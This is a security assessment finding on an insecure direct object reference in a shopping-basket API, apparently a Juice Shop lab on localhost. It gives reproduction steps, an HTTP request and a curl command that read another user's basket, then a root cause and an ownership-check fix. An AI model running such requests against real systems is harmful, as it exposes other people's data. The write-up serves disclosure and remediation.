# F03: Insecure Direct Object Reference (IDOR)

## OWASP Category
**A01: Broken Access Control**

## Target Application
- **URL**: http://localhost:3001/rest/basket/
- **Method**: GET
- **Vulnerable Parameter**: Basket ID in URL path

## Proof of Concept

### Scenario
User A and User B both have baskets. User A can access User B's basket by changing the basket ID in the API request.

### Steps to Reproduce
1. Login as User A (attacker@test.com)
2. Add an item to basket
3. Intercept the basket API request
4. Change the basket ID from `1` to `2`
5. The API returns User B's basket contents

### Evidence

#### Request (Attacker accessing Victim's basket)
```http
GET /rest/basket/2 HTTP/1.1
Host: localhost:3001
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
Response (Victim's basket data)
json

{
  "data": {
    "id": 2,
    "Products": [
      {
        "id": 1,
        "name": "Apple Juice",
        "price": 1.99,
        "quantity": 1
      }
    ]
  }
}

cURL Command

curl -X GET "http://localhost:3001/rest/basket/2" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE"

Root Cause

The application does not verify that the authenticated user owns the basket ID they are requesting. Any valid JWT token can access any basket ID.
Business Impact for Meridian FinServe
Impact	Description
Data Breach	Attackers can view any customer's shopping cart/saved items
Privacy Violation	Customer purchase history exposed
Competitive Intelligence	Rivals can see popular products
Account Takeover	Combined with other vulnerabilities
Remediation
Code Fix - Add Ownership Check
javascript

// Add middleware to verify basket ownership
function verifyBasketOwnership(req, res, next) {
  const basketId = req.params.id;
  const userId = req.user.id;
  
  Basket.findOne({ where: { id: basketId, UserId: userId } })
    .then(basket => {
      if (!basket) {
        return res.status(403).json({ error: 'Access denied' });
      }
      next();
    });
}

// Apply to basket routes
app.get('/rest/basket/:id', verifyBasketOwnership, getBasket);

Implementation Effort: Small (2 hours)
References

    OWASP IDOR Prevention

    CWE-639: Authorization Bypass Through User-Controlled Key
